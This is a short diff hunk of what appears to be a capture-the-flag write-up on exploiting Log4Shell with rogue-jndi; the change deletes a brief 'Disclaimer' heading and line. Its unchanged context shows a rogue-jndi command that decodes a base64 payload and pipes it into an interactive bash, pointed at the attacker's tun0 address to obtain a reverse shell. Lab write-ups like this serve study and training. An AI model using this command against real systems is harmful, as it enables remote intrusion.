@@ -169,10 +169,6 @@ With our `Base64` output, we'll build command in `rogue-jndi`:
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, {your base64 hash}}|{base64,-d}|{bash,-i}" --hostname "{your tun0 ip}"
 ```
 
-#### Disclaimer
-
-Remember to execute it from the right path.
-
 ![rogue-jndi](./Screenshots/unifiedjndi4.png)
 
 Good.
